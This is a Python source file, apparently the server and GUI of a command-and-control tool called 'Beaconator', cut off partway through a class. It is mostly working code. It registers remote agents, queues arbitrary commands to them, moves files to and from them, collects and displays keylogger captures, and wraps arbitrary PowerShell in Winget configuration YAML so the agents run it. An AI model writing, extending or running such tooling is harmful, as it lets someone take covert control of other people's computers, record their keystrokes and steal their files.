# Standard library imports
import logging
import shutil
import socket
import sys
import threading
import time
import re
import json
import ctypes
from logging.handlers import RotatingFileHandler
from datetime import datetime, timedelta, UTC
from pathlib import Path
from socketserver import ThreadingTCPServer, BaseRequestHandler
from typing import Tuple as PyTuple
from typing import Optional, Dict, Any, List, Generator, Union

from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, 
    QHBoxLayout, QPushButton, QTableWidget, QTableWidgetItem,
    QLabel, QTextEdit, QLineEdit, QComboBox, QMessageBox,
    QTabWidget, QSplitter, QGroupBox, QFileDialog, QHeaderView, 
    QStackedWidget, QStyle, QSizePolicy, QTreeWidget, QTreeWidgetItem,
    QPlainTextEdit, QToolTip, QGridLayout, QSpinBox, QTextBrowser, QStackedLayout, QFrame
)
from PyQt6.QtCore import Qt, QTimer, pyqtSignal, QThread, QPropertyAnimation, QSize, QObject, QPoint
from PyQt6.QtGui import QColor, QFont, QIcon, QTextCursor, QTextCharFormat, QSyntaxHighlighter, QPalette, QFontMetrics, QTextBlockFormat, QFontDatabase
from sqlalchemy import create_engine, String, DateTime
from sqlalchemy.orm import DeclarativeBase, Session, sessionmaker
from sqlalchemy.orm import Mapped, mapped_column
from werkzeug.utils import secure_filename
from dataclasses import dataclass
import yaml

 #Configuration
@dataclass
class ServerConfig:
    """Server configuration with default values"""
    APP_ID: str = u'Beaconator.AgentManager'
    LOGS_FOLDER: str = 'logs'
    RESOURCES_FOLDER: str = 'resources'
    FILES_FOLDER: str = 'files'
    DB_PATH: str = 'instance/beaconator.db'
    COMBINED_PORT: int = 5074
    AGENT_TIMEOUT_MINUTES: int = 1
    BUFFER_SIZE: int = 4096
    MAX_RETRIES: int = 5

class ConfigManager:
    def __init__(self, config_file="settings.json"):
        self.config_file = Path(config_file)
        self.settings = self.load_settings()

    def load_settings(self) -> dict:
        default_settings = {
            'port': 5074,  
            'font_size': 14  
        }
        
        if self.config_file.exists():
            try:
                with open(self.config_file, 'r') as f:
                    saved_settings = json.load(f)
                    # Update defaults with saved values
                    default_settings.update(saved_settings)
            except json.JSONDecodeError:
                pass  # Use defaults if file is corrupted
                
        return default_settings

    def get_font_size(self) -> int:
        return self.settings.get('font_size', 14)

    def save_settings(self, port, font_size):
        self.settings = {
            'port': port,
            'font_size': font_size
        }
        with open(self.config_file, 'w') as f:
            json.dump(self.settings, f)

class DocumentationManager:
    def __init__(self):
        self.documentation_path = Path("documentation.md")
        self.section_cache = {}
        self._load_documentation()
        
    def _load_documentation(self):
        if not self.documentation_path.exists():
            return
            
        current_path = []
        current_content = []
        
        with open(self.documentation_path, 'r') as f:
            for line in f:
                line = line.strip()
                if not line:
                    if current_content:
                        current_content.append(line)
                    continue
                    
                if line.startswith('#'):
                    # Save previous section if it exists
                    if current_content and current_path:
                        section_key = '.'.join(current_path)
                        self.section_cache[section_key] = '\n'.join(current_content)
                    
                    # Count heading level and get section name
                    level = len(line) - len(line.lstrip('#'))
                    section_name = line[level:].strip()
                    
                    # Update path based on heading level
                    current_path = current_path[:level-1]
                    current_path.append(section_name)
                    
                    # Start new content collection
                    current_content = [line]
                else:
                    current_content.append(line)
            
            # Save the last section
            if current_content and current_path:
                section_key = '.'.join(current_path)
                self.section_cache[section_key] = '\n'.join(current_content)

    def get_section(self, section_name: str) -> str:
        if not section_name:
            return "Documentation not found"
            
        # For debugging
        print("Available sections:", list(self.section_cache.keys()))
        print("Requested section:", section_name)
        
        # Get the content for the requested section
        content = self.section_cache.get(section_name, "Documentation not found")
        
        # If found, also check for and append any subsections
        if content != "Documentation not found":
            for key, value in self.section_cache.items():
                if key.startswith(section_name + "."):
                    content += "\n\n" + value
                    
        return content

# Global configuration instance
config = ServerConfig()

# Ensure required directories exist
Path(config.LOGS_FOLDER).mkdir(exist_ok=True)
Path(config.FILES_FOLDER).mkdir(exist_ok=True)
Path('instance').mkdir(parents=True, exist_ok=True)

class Logger(QObject):
    new_log = pyqtSignal(str)

    def __init__(self):
        super().__init__()
        self.setup_file_logger()
        
    def setup_file_logger(self):
        log_path = Path(config.LOGS_FOLDER) / "manager.log"
        
        # Ensure logs directory exists
        log_path.parent.mkdir(parents=True, exist_ok=True)
        
        # Setup file handler with rotation
        self.file_logger = logging.getLogger('manager')
        self.file_logger.setLevel(logging.INFO)
        
        # Create a rotating file handler (10 MB max size, keep 1 backup file)
        handler = RotatingFileHandler(
            log_path, maxBytes=10*1024*1024, backupCount=1, encoding='utf-8'
        )
        
        # Create formatter
        formatter = logging.Formatter('%(asctime)s [%(levelname)s] %(message)s')
        handler.setFormatter(formatter)
        
        self.file_logger.addHandler(handler)

    def log_message(self, message: str):
        """Log a message with timestamp"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        formatted_message = f"[{timestamp}] {message}"
            
        # Emit signal for GUI
        self.new_log.emit(formatted_message)

# Create a global logger instance
logger = Logger()

# Required for Taskbar Icon
if sys.platform == 'win32':
    try:
        ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID(config.APP_ID)
    except Exception as e:
        logger.log_message(f"Failed to set taskbar icon: {e}")

# Database Models
class Base(DeclarativeBase):
    """SQLAlchemy Base class for all models"""
    pass

class Agent(Base):
    """Agent database model"""
    __tablename__ = 'agent'
    
    id: Mapped[int] = mapped_column(primary_key=True)
    agent_id: Mapped[str] = mapped_column(String(80), unique=True, nullable=False)
    computer_name: Mapped[str] = mapped_column(String(80), nullable=False)
    status: Mapped[str] = mapped_column(String(80), nullable=False, default='online')
    last_checkin: Mapped[datetime] = mapped_column(DateTime, default=datetime.now)
    pending_command: Mapped[Optional[str]] = mapped_column(String(200), nullable=True)
    output_file: Mapped[Optional[str]] = mapped_column(String(200), nullable=True)
    last_response: Mapped[Optional[str]] = mapped_column(String(500), nullable=True)

    def to_dict(self) -> Dict[str, Any]:
        """Convert agent to dictionary representation"""
        return {
            'agent_id': self.agent_id,
            'computer_name': self.computer_name,
            'status': self.status,
            'last_checkin': self.last_checkin.strftime("%Y-%m-%d %H:%M:%S %z")
        }

# Core Service Classes
class AgentRepository:
    """Repository pattern for Agent database operations with proper session management"""
    def __init__(self, session_factory):
        """Initialize with session factory instead of single session"""
        self.session_factory = session_factory

    def _get_session(self) -> Session:
        """Get a new session for each operation"""
        return self.session_factory()

    def get_agent(self, agent_id: str) -> Optional[Agent]:
        with self._get_session() as session:
            return session.query(Agent).filter_by(agent_id=agent_id).first()

    def update_agent_status(self, agent_id: str, status: str, computer_name: Optional[str] = None):
        with self._get_session() as session:
            agent = session.query(Agent).filter_by(agent_id=agent_id).first()
            if not agent:
                agent = Agent(
                    agent_id=agent_id,
                    computer_name=computer_name or "Unknown",
                    status=status,
                    last_checkin=datetime.now()
                )
                session.add(agent)
            else:
                agent.status = status
                agent.last_checkin = datetime.now()
                if computer_name:
                    agent.computer_name = computer_name
            session.commit()

    def update_agent_command(self, agent_id: str, command: Optional[str]):
        with self._get_session() as session:
            if agent := session.query(Agent).filter_by(agent_id=agent_id).first():
                agent.pending_command = command
                session.commit()
                if not command == None:
                    logger.log_message(f"Command Scheduled: {agent_id} - {command}")

    def update_agent_response(self, agent_id: str, response: str):
        with self._get_session() as session:
            if agent := session.query(Agent).filter_by(agent_id=agent_id).first():
                agent.last_response = response
                session.commit()

    def get_all_agents(self) -> List[Agent]:
        with self._get_session() as session:
            return session.query(Agent).all()

    def mark_timed_out_agents(self, timeout_minutes: int):
        with self._get_session() as session:
            timeout = datetime.now() - timedelta(minutes=timeout_minutes)
            agents = session.query(Agent).filter(
                Agent.status == 'online',
                Agent.last_checkin < timeout
            ).all()
            for agent in agents:
                agent.status = 'offline'
            session.commit()

    def delete_agent(self, agent_id: str) -> bool:
        """
        Delete an agent from the database.
        Returns True if agent was found and deleted, False if agent wasn't found.
        """
        with self._get_session() as session:
            if agent := session.query(Agent).filter_by(agent_id=agent_id).first():
                session.delete(agent)
                session.commit()
                return True
            return False

class ServerManager:
    """Manages server lifecycle and coordination"""
    def __init__(self, config: ServerConfig, agent_repository: AgentRepository):
        self.config = config
        self.agent_repository = agent_repository
        self.command_processor = CommandProcessor(agent_repository)
        self.file_transfer_service = FileTransferService()
        self.module_handler = ModuleHandler(agent_repository)
        self.connection_handler = ConnectionHandler(
            self.command_processor,
            self.file_transfer_service,
            config.BUFFER_SIZE
        )
        self.server = None
        self._shutdown = threading.Event()
        self.server_thread = None

    def start(self):
        """Start server and monitoring threads"""
        self.server = self._create_server()
        
        # Start server in its own thread
        self.server_thread = threading.Thread(
            target=self._run_server,
            daemon=True,
            name="ServerThread"
        )
        self.server_thread.start()
        
        # Start agent status monitor
        monitor_thread = threading.Thread(
            target=self._monitor_agent_status,
            daemon=True,
            name="StatusMonitorThread"
        )
        monitor_thread.start()
        
        return self.server_thread, monitor_thread

    def shutdown(self):
        """Gracefully shutdown server and threads"""
        logger.log_message("Initiating server shutdown...")
        self._shutdown.set()
        if self.server:
            self.server.shutdown()
            self.server.server_close()
        logger.log_message("Server shutdown complete")

    def _create_server(self) -> ThreadingTCPServer:
        """Create and configure the server"""
        class CustomRequestHandler(BaseRequestHandler):
            def handle(self_handler):
                self.connection_handler.handle_connection(
                    self_handler.request,
                    self_handler.client_address
                )

        server = ThreadingTCPServer(
            ('0.0.0.0', self.config.COMBINED_PORT),
            CustomRequestHandler
        )
        server.allow_reuse_address = True
        return server

    def _run_server(self):
        """Run the server until shutdown"""
        try:
            logger.log_message(f"Server listening on port {self.config.COMBINED_PORT}")
            while not self._shutdown.is_set():
                self.server.handle_request()
        except Exception as e:
            logger.log_message(f"Server error: {e}")
        finally:
            logger.log_message("Server thread stopping")

    def _monitor_agent_status(self):
        """Monitor and update agent status"""
        while not self._shutdown.is_set():
            try:
                self.agent_repository.mark_timed_out_agents(
                    self.config.AGENT_TIMEOUT_MINUTES
                )
            except Exception as e:
                logger.log_message(f"Error in status monitor: {e}")
            time.sleep(60)  # Check every minute

    def change_port(self, new_port: int):
        """Change the server port"""
        try:
            logger.log_message(f"Changing server port from {self.config.COMBINED_PORT} to {new_port}")
            
            # Signal thread to stop
            self._shutdown.set()
            
            # Close the existing server socket
            if self.server:
                self.server.socket.close()
                self.server.server_close()
            
            # Wait for server thread to stop
            if self.server_thread:
                self.server_thread.join(timeout=2)
            
            # Update the port
            self.config.COMBINED_PORT = new_port
            
            # Reset shutdown flag
            self._shutdown.clear()
            
            # Create new server
            self.server = self._create_server()
            
            # Start new server thread
            self.server_thread = threading.Thread(
                target=self._run_server,
                daemon=True,
                name="ServerThread"
            )
            self.server_thread.start()
            
            logger.log_message(f"Server now listening on port {new_port}")
            return True
            
        except Exception as e:
            logger.log_message(f"Failed to change port: {e}")
            return False

class ServerRestartThread(QThread):
    finished = pyqtSignal(bool)  # Signal to indicate success/failure

    def __init__(self, server_manager, new_port):
        super().__init__()
        self.server_manager = server_manager
        self.new_port = new_port

    def run(self):
        try:
            logger.log_message(f"[DEBUG] Starting port change process from {self.server_manager.config.COMBINED_PORT} to {self.new_port}")
            
            # Set shutdown flag and stop current server
            logger.log_message("[DEBUG] Setting shutdown flag")
            self.server_manager._shutdown.set()
            
            if self.server_manager.server:
                logger.log_message("[DEBUG] Calling server.shutdown()")
                self.server_manager.server.shutdown()
                logger.log_message("[DEBUG] Calling server.server_close()")
                self.server_manager.server.server_close()
            
            # Update port
            logger.log_message(f"[DEBUG] Updating COMBINED_PORT to {self.new_port}")
            self.server_manager.config.COMBINED_PORT = self.new_port
            
            # Clear shutdown flag for new server
            logger.log_message("[DEBUG] Clearing shutdown flag")
            self.server_manager._shutdown.clear()
            
            # Create and start new server
            logger.log_message("[DEBUG] Creating new server")
            self.server_manager.server = self.server_manager._create_server()
            
            # Start new server thread
            logger.log_message("[DEBUG] Starting new server thread")
            self.server_manager.server_thread = threading.Thread(
                target=self.server_manager._run_server,
                daemon=True,
                name="ServerThread"
            )
            self.server_manager.server_thread.start()
            
            logger.log_message(f"[DEBUG] Server restart process complete on port {self.new_port}")
            self.finished.emit(True)
        except Exception as e:
            logger.log_message(f"[DEBUG] Error during restart: {str(e)}")
            self.finished.emit(False)

# Database setup function
def setup_database(db_path: str) -> PyTuple[sessionmaker, AgentRepository]:
    """Setup database and return session factory and repository"""
    engine = create_engine(f'sqlite:///{db_path}')
    Base.metadata.create_all(engine)
    SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
    return SessionLocal, AgentRepository(SessionLocal)

class literal(str): pass
def literal_presenter(dumper, data):
    return dumper.represent_scalar('tag:yaml.org,2002:str', data, style='|')
yaml.add_representer(literal, literal_presenter)

class ModuleHandler:
    """Handles module execution"""
    def __init__(self, agent_repository: AgentRepository):
        self.agent_repository = agent_repository

    def execute_winget_ps(self, agent_id: str, powershell_script: Union[str, List[str]]):
        """ Create Winget config YAML for PowerShell script execution"""

        filepath = Path(config.FILES_FOLDER) / f"{agent_id}_config.yaml"

        if isinstance(powershell_script, list):
            powershell_script = '\n'.join(powershell_script)

            # Create the configuration structure
        base_string = {
            "properties": {
                "resources": [
                    {
                        "resource": "PSDscResources/Script",
                        "id": "myAppConfig",
                        "directives": {
                            "description": "Run Powershell Command",
                            "allowPrerelease": True
                        },
                        "settings": {
                            "GetScript": literal("#\"state\""),
                            "TestScript": literal("return $false"),
                            "SetScript": literal(powershell_script)
                        }
                    }
                ],
                "configurationVersion": "0.2.0"
            }
        }

        yaml_content = yaml.dump(base_string, 
                default_flow_style=False,
                sort_keys=False,
                width=float("inf"),
                allow_unicode=True)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(yaml_content)

class CommandProcessor:
    """Processes and validates agent commands"""
    def __init__(self, agent_repository: AgentRepository):
        self.agent_repository = agent_repository

    def process_registration(self, agent_id: str, computer_name: str) -> str:
        self.agent_repository.update_agent_status(agent_id, 'online', computer_name)
        logger.log_message(f"Agent Registration: {agent_id} ({computer_name})")
        return "Registration successful"

    def process_action_request(self, agent_id: str) -> str:
        agent = self.agent_repository.get_agent(agent_id)
        self.agent_repository.update_agent_status(agent_id, "online")
        if not agent.pending_command:
            logger.log_message(f"Check In: {agent_id} - No pending commands")
            return "no_pending_commands"
        
        if not agent:
            return ""

        command = agent.pending_command
        self.agent_repository.update_agent_command(agent_id, None)

        return self._format_command_response(command)

    def process_command_output(self, agent_id: str, output: str = "") -> str:
        """Process command output from an agent"""
        try:
            # Store the output in the agent's output file
            output_file = Path(config.LOGS_FOLDER) / f"output_{agent_id}.txt"
            with open(output_file, 'a', encoding='utf-8') as f:
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                f.write(f"[{timestamp}] {output}")
            
            # Clear the pending command since received output
            self.agent_repository.update_agent_command(agent_id, None)
            
            # Update the agent's output file path if needed
            agent = self.agent_repository.get_agent(agent_id)
            if agent and not agent.output_file:
                self.agent_repository.update_agent_response(
                    agent_id,
                    str(output_file)
                )
            
            return "Output received"
        except Exception as e:
            logger.log_message(f"Command Output Error: {agent_id} - {str(e)}")
            return f"Error processing output: {str(e)}"
        
    def process_keylogger_output(self, agent_id: str, output: str = "") -> str:
        """Process KeyLogger output from an agent"""
        try:
            output_file = Path(config.LOGS_FOLDER) / f"keylogger_output_{agent_id}.txt"
            
            # Handle special character encodings
            special_chars = {
                "%20": " ",   # Space
                "%0A": "\n",  # Newline
                "%09": "\t",  # Tab
                "%0D": "\r",  # Carriage return
                "%08": "⌫"   # Backspace
            }
            
            # Replace encoded characters
            for encoded, char in special_chars.items():
                output = output.replace(encoded, char)
                
            with open(output_file, 'a', encoding='utf-8') as f:
                f.write(output)
                f.flush()
                
            return "KeyLogger data received"
        except Exception as e:
            logger.log_message(f"Error processing keylogger output: {e}")
            return f"Error: {e}"

    def process_download_status(self, agent_id: str, filename: str, status: str) -> str:
        self.agent_repository.update_agent_response(agent_id, f"{status}|{filename}")
        return "Status updated"

    @staticmethod
    def _format_command_response(command: str) -> str:
        """Format a command string into a pipe-delimited response format."""

        # Special handling for file operations
        if command.startswith(("download_file ", "upload_file ")):
            action, parameter = command.split(" ", 1)
            return f"{action}|{parameter}"
        
        # Handle execute_module commands
        if command.startswith("execute_module"):
            _, parameter = command.split("|", 1)
            return f"execute_module|{parameter}"
        
        # Default case for regular commands
        return f"execute_command|{command}"

class FileTransferService:
    """Handles file transfer operations"""

    @staticmethod
    def send_file(conn: socket.socket, filename: str) -> bool:
        """Send file to agent"""
        try:
            filepath = Path(config.FILES_FOLDER) / secure_filename(filename)
            if not filepath.exists():
                conn.send(b'ERROR|File not found')
                logger.log_message(f"File Transfer Failed: {filename} - File not found")
                return False
                
            try:
                filesize = filepath.stat().st_size
                logger.log_message(f"File Transfer Started: {filename} ({filesize/1024:.1f} KB)")
                
                # Set socket options for larger transfers
                conn.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576)  # 1MB buffer
                
                # Send file in chunks
                CHUNK_SIZE = 1048576  # 1MB chunks
                bytes_sent = 0
                
                with open(filepath, 'rb') as f:
                    while True:
                        chunk = f.read(CHUNK_SIZE)
                        if not chunk:
                            break
                            
                        bytes_sent += conn.send(chunk)
                        if bytes_sent >= 1048576:  # Log every MB
                            logger.log_message(f"File Transfer Progress: {filename} - {bytes_sent//1048576}MB sent")
                    
                logger.log_message(f"File Transfer Complete: {filename} ({bytes_sent/1024:.1f} KB)")
                return True
                
            except Exception as e:
                conn.send(f"ERROR|Could not read file: {str(e)}".encode('utf-8'))
                logger.log_message(f"Error reading file {filename}: {e}")
                return False
            
        except Exception as e:
            logger.log_message(f"Error sending file: {e}")
            return False

    @staticmethod
    def receive_file(conn: socket.socket, filename: str) -> bool:
        """Receive file from agent"""
        try:
            logger.log_message(f"Starting file receive for: {filename}")
            filepath = Path(config.FILES_FOLDER) / secure_filename(filename)
            
            # Set socket options for larger transfers
            conn.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1048576)  # 1MB buffer
            
            with open(filepath, 'wb') as f:
                total_received = 0
                while True:
                    try:
                        chunk = conn.recv(1048576)  # 1MB chunks
                        if not chunk:
                            break
                        
                        f.write(chunk)
                        total_received += len(chunk)
                        
                        if total_received >= 1048576:  # Log every MB
                            logger.log_message(f"Received {total_received//1048576}MB")
                            
                    except socket.timeout:
                        if total_received > 0:
                            break
                        raise
            
            if total_received > 0:
                logger.log_message(f"File {filename} received and saved ({total_received} bytes)")
                conn.send(b'SUCCESS')
                return True
            else:
                logger.log_message("No data received")
                conn.send(b'ERROR|No data received')
                return False
                
        except Exception as e:
            logger.log_message(f"Error receiving file: {e}")
            try:
                conn.send(f"ERROR|{str(e)}".encode('utf-8'))
            except:
                pass
            return False

class AgentUpdateWorker(QThread):
    """Background worker to update agent statuses"""
    agent_updated = pyqtSignal(list)

    def __init__(self, agent_repository: AgentRepository):
        super().__init__()
        self.agent_repository = agent_repository
        self._running = True  # Add running flag

    def run(self):
        while self._running:  # Use running flag
            try:
                agents = self.agent_repository.get_all_agents()
                self.agent_updated.emit([agent.to_dict() for agent in agents])
            except Exception as e:
                logger.log_message(f"Error updating agents: {e}")
            self.msleep(1000)  # 1 second delay

    def stop(self):  # Implement stop method
        self._running = False
        self.wait()  # Wait for the thread to finish

class CommandOutputMonitor(QThread):
    """Monitor output from a specific agent"""
    output_received = pyqtSignal(str)
    
    def __init__(self, agent_id: str, agent_repository: AgentRepository):
        super().__init__()
        self.agent_id = agent_id
        self.agent_repository = agent_repository
        self.running = True
        self.output_file = Path(config.LOGS_FOLDER) / f"output_{agent_id}.txt"
        self.last_content = None

    def get_latest_content(self, content: str) -> str:
        """Extract content from the last timestamp onwards"""
        # Match timestamp pattern [YYYY-MM-DD HH:MM:SS]
        timestamps = list(re.finditer(r'\[\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}\]', content))
        
        if not timestamps:
            return content
            
        # Get the position of the last timestamp
        last_timestamp_pos = timestamps[-1].start()
        return content[last_timestamp_pos:]

    def run(self):
        while self.running:
            try:
                if self.output_file.exists():
                    with open(self.output_file, 'r') as f:
                        content = f.read()
                        if content:
                            latest_content = self.get_latest_content(content)
                            # Only emit if content has changed
                            if latest_content != self.last_content:
                                self.last_content = latest_content
                                self.output_received.emit(latest_content)
                                
            except Exception as e:
                logger.log_message(f"Error reading output file: {e}")
            self.msleep(100)

    def stop(self):
        self.running = False

class OutputDisplay(QWidget):
    def __init__(self, agent_repository: AgentRepository):
        super().__init__()
        self.agent_repository = agent_repository
        self.current_agent_id = None
        self.output_monitor = None
        FontManager().add_relative_font_widget(self, 0)
        self.font_manager = FontManager()
        self.setup_ui()

    def setup_ui(self):
        layout = QVBoxLayout()
        self.output_display = QPlainTextEdit()
        self.output_display.setReadOnly(True)
        self.output_display.setPlaceholderText("Waiting for command output...")
        self.font_manager.add_relative_font_widget(self.output_display, -4)
        self.output_display.setFont(QFont("Consolas", 10))
        
        layout.addWidget(self.output_display)
        self.setLayout(layout)

    def set_agent(self, agent_id: str):
        """Switch to monitoring a different agent"""
        if agent_id == self.current_agent_id:
            return
            
        self.current_agent_id = agent_id
        self.output_display.clear()
        
        # Stop existing monitor if any
        if self.output_monitor is not None:
            self.output_monitor.stop()
            self.output_monitor.wait()
        
        # Start new monitor
        self.output_monitor = CommandOutputMonitor(agent_id, self.agent_repository)
        self.output_monitor.output_received.connect(self.update_output)
        self.output_monitor.start()

    def update_output(self, text: str):
        """Update the display with new content, filtering out blank lines"""
        filtered_text = '\n'.join(filter(lambda x: not re.match(r'^\s*$', x), text.split('\n')))
        if filtered_text:
            # Update the text
            self.output_display.setPlainText(filtered_text)
            # Scroll to bottom since we have new content
            self.output_display.verticalScrollBar().setValue(
                self.output_display.verticalScrollBar().maximum()
            )

    def cleanup(self):
        """Cleanup resources before widget destruction"""
        if self.output_monitor is not None:
            self.output_monitor.stop()
            self.output_monitor.wait()

class KeyLoggerOutputMonitor(QThread):
    """Monitor KeyLogger output from a specific agent"""
    output_received = pyqtSignal(str)
    
    def __init__(self, agent_id: str, agent_repository: AgentRepository):
        super().__init__()
        self.agent_id = agent_id
        self.agent_repository = agent_repository
        self.running = True
        self.output_file = Path(config.LOGS_FOLDER) / f"keylogger_output_{agent_id}.txt"
        self.last_content = None

    def run(self):
        while self.running:
            try:
                if self.output_file.exists():
                    with open(self.output_file, 'r', encoding='utf-8', errors='replace') as f:
                        content = f.read()
                        if content and content != self.last_content:
                            self.last_content = content
                            self.output_received.emit(content)
                                
            except Exception as e:
                logger.log_message(f"Error reading output file: {e}")
            self.msleep(100)

    def stop(self):
        self.running = False

class KeyLoggerDisplay(QWidget):
    def __init__(self, agent_repository: AgentRepository):
        super().__init__()
        self.agent_repository = agent_repository
        self.current_agent_id = None
        self.output_monitor = None
        FontManager().add_relative_font_widget(self, 0)
        self.font_manager = FontManager()
        self.setup_ui()

    def setup_ui(self):
        layout = QVBoxLayout()

        # Create horizontal layout for buttons
        button_layout = QHBoxLayout()
        
        self.start_btn = QPushButton("Start KeyLogger")
        self.start_btn.clicked.connect(self.send_KeyLogger_start) 
        
        self.stop_btn = QPushButton("Stop KeyLogger")
        self.stop_btn.clicked.connect(self.send_KeyLogger_stop) 
        
        # Add buttons to horizontal layout
        button_layout.addWidget(self.start_btn)
        button_layout.addWidget(self.stop_btn)
        
        # Add button layout to main layout
        layout.addLayout(button_layout)

        self.output_display = QPlainTextEdit()
        self.output_display.setReadOnly(True)
        self.output_display.setPlaceholderText("Waiting for KeyLogger output...")
        self.font_manager.add_relative_font_widget(self.output_display, -2)
        self.output_display.setFont(QFont("Consolas"))
        layout.addWidget(self.output_display)
        self.setLayout(layout)

    def send_KeyLogger_start(self):
        if not self.current_agent_id:
            QMessageBox.warning(self, "Warning", "No agent selected!")
            return
        command = "execute_module|KeyLogger|start"
        try:
            self.agent_repository.update_agent_command(self.current_agent_id, command)
        except Exception as e:
            import traceback
            logger.log_message(f"Error on line {traceback.extract_tb(e.__traceback__)[-1].lineno}")
            QMessageBox.warning(self, "Error", f"Failed to send: {str(e)}")

    def send_KeyLogger_stop(self):
        if not self.current_agent_id:
            QMessageBox.warning(self, "Warning", "No agent selected!")
            return
        command = "execute_module|KeyLogger|stop"
        try:
            self.agent_repository.update_agent_command(self.current_agent_id, command)
        except Exception as e:
            import traceback
            logger.log_message(f"Error on line {traceback.extract_tb(e.__traceback__)[-1].lineno}")
            QMessageBox.warning(self, "Error", f"Failed to send: {str(e)}")

    def set_agent(self, agent_id: str):
        if agent_id == self.current_agent_id:
            return
            
        self.current_agent_id = agent_id
        self.output_display.clear()
        
        if self.output_monitor is not None:
            self.output_monitor.stop()
            self.output_monitor.wait()
        
        self.output_monitor = KeyLoggerOutputMonitor(agent_id, self.agent_repository)
        self.output_monitor.output_received.connect(self.update_output)
        self.output_monitor.start()

    def update_output(self, text: str):
        self.output_display.setPlainText(text)
        self.output_display.verticalScrollBar().setValue(
            self.output_display.verticalScrollBar().maximum()
        )

    def cleanup(self):
        if self.output_monitor is not None:
            self.output_monitor.stop()
            self.output_monitor.wait()

class LogWidget(QTextEdit):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setReadOnly(True)
        self.setFont(QFont("Consolas"))  # Use monospace font
        FontManager().add_relative_font_widget(self, 0)

        base_style = self.styleSheet()
        self.setStyleSheet(base_style + """
            QTextEdit {
                background-color: #121212;
                color: #ffffff;
                border: none;
                font-size: 12pt;
            }
        """)

        # Initialize syntax highlighter
        self.highlighter = LogHighlighter(self.document())
        self.level_colors = {
            'ERROR': '#ff6b6b',
            'WARNING': '#ffd93d',
            'INFO': '#ffffff',
            'DEBUG': '#6bff6b'
        }

    def append_log(self, message: str, level: str = 'INFO'):
        self.append(message)
        # Auto-scroll to bottom
        self.verticalScrollBar().setValue(self.verticalScrollBar().maximum())

class LogHighlighter(QSyntaxHighlighter):
    def __init__(self, parent=None):
        super().__init__(parent)
        
        # Enhanced color scheme
        self.colors = {
            'timestamp': '#8BE9FD',  # Light blue for timestamps
            'event_type': '#FFB86C',  # Pink for event types (Agent Registration, File Transfer, etc)
            'agent_id': '#50FA7B',    # Green for agent IDs
            'status': {
                'success': '#50FA7B',  # Green for success messages
                'error': '#FF5555',    # Red for errors
                'warning': '#FFB86C',  # Orange for warnings
                'info': '#F8F8F2'      # White for info
            },
            'file_info': '#BD93F9',   # Purple for file names and sizes
            'progress': '#F1FA8C',     # Yellow for progress indicators
            'network': '#8BE9FD',      # Light blue for network addresses/ports
            'separator': '#6272A4'     # Soft purple for separators
        }
        
        # Create format patterns
        self.highlighting_rules = []
        
        # Timestamp
        timestamp_format = QTextCharFormat()
        timestamp_format.setForeground(QColor(self.colors['timestamp']))
        font = QFont("Consolas", 8)
        timestamp_format.setFont(font)
        self.highlighting_rules.append(
            (re.compile(r'\[\d{4}-\d{2}-\d{2}\s\d{2}:\d{2}:\d{2}\]'),
             timestamp_format)
        )
        
        # Event types
        event_format = QTextCharFormat()
        event_format.setForeground(QColor(self.colors['event_type']))
        self.highlighting_rules.append(
            (re.compile(r'(?:Agent Registration|File Transfer|Command|Connection|Received|Check In|Command Scheduled)(?=:)'),
             event_format)
        )

        # command types
        command_format = QTextCharFormat()
        command_format.setForeground(QColor(self.colors['agent_id']))  # Using the same green as agent IDs
        self.highlighting_rules.append(
            (re.compile(r'(?<=: )(request_action|execute_command|download_file|upload_file|execute_module|command_output)(?=\|)'),
            command_format)
        )
        
        # Agent IDs (8-character)
        agent_format = QTextCharFormat()
        agent_format.setForeground(QColor(self.colors['agent_id']))
        self.highlighting_rules.append(
            (re.compile(r'[a-f0-9]{8}'),
             agent_format)
        )
        
        # File information
        file_format = QTextCharFormat()
        file_format.setForeground(QColor(self.colors['file_info']))
        self.highlighting_rules.append(
            (re.compile(r'(?<=: )[\w.-]+\.(txt|exe|dll|py|json|log|cfg)(?=\s\(|\s-|$)'),  # Matches only filenames with extensions
            file_format)
        )
        
        # Progress and sizes
        progress_format = QTextCharFormat()
        progress_format.setForeground(QColor(self.colors['progress']))
        self.highlighting_rules.append(
            (re.compile(r'\d+(?:\.\d+)?\s*(?:KB|MB|bytes)|\d+%'),
             progress_format)
        )
        
        # Error messages
        error_format = QTextCharFormat()
        error_format.setForeground(QColor(self.colors['status']['error']))
        self.highlighting_rules.append(
            (re.compile(r'(?:Error|Failed|failed|error):.*$'),
             error_format)
        )
        
        # Network addresses
        network_format = QTextCharFormat()
        network_format.setForeground(QColor(self.colors['network']))
        self.highlighting_rules.append(
            (re.compile(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(?::\d+)?'),
             network_format)
        )
        
        # Separators
        separator_format = QTextCharFormat()
        separator_format.setForeground(QColor(self.colors['separator']))
        self.highlighting_rules.append(
            (re.compile(r'(?<=[a-z_])\|(?=[a-f0-9]{8})|(?<=[a-f0-9]{8})\s-\s'),  # Only match pipe between command and agent ID, or dash after agent ID
            separator_format)
        )
                # Store the command output format separately since we'll handle it differently
        self.command_output_format = QTextCharFormat()
        self.command_output_format.setFont(QFont("Consolas", 6))

    def highlightBlock(self, text):
        # Check if this block is a command output line or continuation
        if text.startswith('command_output|'):
            # Format the entire line including the command_output|agentid| part
            self.setFormat(0, len(text), self.command_output_format)
        else:
            previous_block = self.currentBlock().previous()
            if previous_block.isValid():
                previous_text = previous_block.text()
                if (previous_text.startswith('command_output|') or 
                    (not text.startswith('[') and  
                     not any(text.startswith(cmd) for cmd in ['Agent', 'File', 'Command', 'Connection', 'Received', 'Check']))):
                    self.setFormat(0, len(text), self.command_output_format)
                else:
                    # Apply regular rules
                    for pattern, format in self.highlighting_rules:
                        for match in pattern.finditer(text):
                            start, end = match.span()
                            self.setFormat(start, end - start, format)


class AgentTableWidget(QTableWidget):
    agent_selected = pyqtSignal(str)
    
    def __init__(self):
        super().__init__()
        self.selected_agent_id = None
